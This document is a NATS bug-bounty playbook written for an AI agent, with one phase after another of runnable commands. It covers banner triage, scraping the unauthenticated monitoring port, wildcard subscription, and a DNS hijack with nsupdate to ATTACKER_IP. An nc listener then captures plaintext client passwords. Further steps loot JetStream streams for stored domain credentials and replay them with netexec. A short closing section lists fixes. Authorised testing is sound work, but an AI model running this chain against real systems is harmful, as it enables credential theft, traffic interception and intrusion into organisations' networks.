---
technology: NATS
kind: bug-bounty-methodology
audience: ai-agent
status: upstream-only
family: messaging
version: "1.0"
source: "upstream-only; zero corpus evidence by design (owner-approved new-unit wave 2026-11-13) — verified against docs.nats.io (monitoring endpoints and query params, subjects/wildcards, JetStream direct get, TLS docs) and the nats-server repo + rewritten from HackTricks (src/network-services-pentesting/4222-pentesting-nats.md), CC BY-NC 4.0, accessed 2026-11-13"
provenance: "hybrid: corpus-grounded (1 ledger rows, internal coverage ledger) + HackTricks enrichment 2026-11-13; credit in source line"
---

# NATS bug-bounty methodology

Companion overview: [[nats]].

Scope: the NATS client port 4222, the optional HTTP monitoring port 8222, JetStream persistence, and the credential-capture chain against DNS-dependent plaintext clients. Sibling brokers with their own units: [[activemq]], [[rabbitmq]], [[mqtt]].

## Phase 0 — Banner triage (pre-auth)

The server speaks first; `nc` is a complete NATS client for recon:

```bash
echo | nc 198.51.100.10 4222
# INFO {"server_id":"NCLWJ...","version":"2.11.3","proto":1,
#       "auth_required":true,"jetstream":true,"max_payload":1048576}
# -ERR 'Authorization Violation'
```

```bash
nmap -p4222 -sV --script banner 198.51.100.10
```

Decision table on the INFO fields: `auth_required:false` → Phase 2 unauthenticated; `auth_required:true` + `tls_required:false` → Phase 3 credential capture is viable; `jetstream:true` → Phase 4 looting after any cred; `tls_required:true` → capture requires TLS without server-identity validation (rare, weaker).

Deeper interaction: the official `nats` CLI (`go install github.com/nats-io/natscli/nats@latest`); check the Go toolchain requirement before building. Failed auth raises `nats: Authorization Violation` immediately — no meaningful RPC without valid creds.

## Phase 1 — Monitoring port (8222, unauthenticated by default)

Before guessing subjects, ask the node what it already knows. Each endpoint is a plain GET returning JSON; query params scope it:

```bash
curl -s 'http://198.51.100.10:8222/connz?subs=true&auth=true' \
  | jq -r '.connections[] | [.account, .authorized_user, (.subscriptions_list // [] | join(","))] | @tsv'
curl -s 'http://198.51.100.10:8222/jsz?accounts=true&streams=true' | jq
curl -s 'http://198.51.100.10:8222/varz' | jq '{version, connections, in_msgs}'
curl -s 'http://198.51.100.10:8222/routez' | jq
```

`?subs=true` lists each connection's subscriptions (subject names), `?auth=true` fills in account and authorized user, `?acc=<name>` scopes to one account. A node reports only the connections IT sees — sweep every cluster member. Output feeds Phase 2/4: subject names and JetStream stream names.

## Phase 2 — Live traffic with any (or no) credential

Store the working credential as a CLI context once, then subscribe wildcards:

```bash
nats context add target -s nats://198.51.100.10:4222 --user USERNAME --password '<PASSWORD>'
nats sub --context target '>'          # everything new in this account
nats sub --context target 'orders.>'   # narrow to an interesting branch
```

Wildcard semantics: `*` matches exactly one token, `>` the entire trailing hierarchy. Core NATS never replays old messages — you observe only what is published while you listen; subject permissions or a different account can block delivery even when the subscribe succeeds. Retained history is Phase 4.

## Phase 3 — Credential capture via name hijack

For a broker reached by DNS name (typical: `nats-svc.example.com`):

1. Check for a stale record. If the name returns NXDOMAIN, default AD dynamic-update ACLs often let a low-privileged domain user recreate it (background: [[dns]]).
2. Point it at you:

```bash
nsupdate
> server 198.51.100.5
> update add nats-svc.example.com 60 A ATTACKER_IP
> send
```

3. Mirror the real banner and listen — nothing past the INFO frame is needed to harvest:

```bash
nc 198.51.100.10 4222 | head -1 | nc -lnvp 4222
```

The first internal client that resolves the hijacked name emits a plaintext `CONNECT` frame with the `user`/`pass` pair plus telemetry (client name, Go version, protocol level). Conditions: plaintext NATS, or TLS without server-identity validation; correctly validated TLS defeats simple DNS impersonation. For longer engagements, build `nats-server` from source for the target version — TRACE logging exposes usernames, instrumentation or packet capture can surface more auth material when the transport is unencrypted.

## Phase 4 — JetStream looting

With any accepted credential:

```bash
nats account info --context target    # quotas, stream count, expiration
nats stream list --context target     # names + message totals
nats stream info auth_logs --context target
nats stream view auth_logs --context target
```

**Read stored messages without a consumer** — `stream get` fetches by sequence or last-per-subject without creating a consumer or advancing any ack cursor (useful when consumer creation is denied or would disturb a work queue; the account still needs publish rights on the get-request subject plus a reply-inbox subscribe):

```bash
nats stream info auth_logs --context target          # note sequences + subjects
nats stream get auth_logs 1 --context target
nats stream get auth_logs --last-for logs.auth --context target
```

For a narrow account that can hit the get subject but not list streams, speak the API directly — response JSON carries base64-encoded message data:

```bash
nats request --context target '$JS.API.STREAM.MSG.GET.auth_logs' '{"last_by_subj":"logs.auth"}'
```

Loot pattern: telemetry pipelines persist raw JSON auth events onto subjects like `logs.auth`; payloads have included live AD usernames and passwords, replayable against Kerberos-aware services with a tool such as netexec (`netexec smb DC -u USER -p PASS -k`).

**Filesystem angle:** any file-read primitive (exposed NFS export, arbitrary-read bug, container mount) reaches the JetStream store directory — stream state and message payloads are recoverable from the raw store files, a way to loot history without touching 4222 at all.

## Phase 5 — Reporting the fix

Enforce and validate TLS (`tls_required` behavior), consider mTLS client certs (NKeys/`.creds` are auth material, distinct from TLS client certificates); delegate DNS update rights for broker names and audit dynamic changes; scrub secrets before publishing, set retention/age limits, restrict stream-management permissions; alert on banner anomalies (short-lived connections, INFO that deviates from the deployed template — spoofed servers).

## Appendix — tools in prose

`nats` (natscli: contexts, sub, stream view/get, request, account info), `nc`, `nmap` (banner NSE), `curl` + `jq` for the monitoring endpoints, `nsupdate` for DNS hijack, netexec for cred replay, `nats-server` source for lab-side banner mirroring and TRACE analysis.
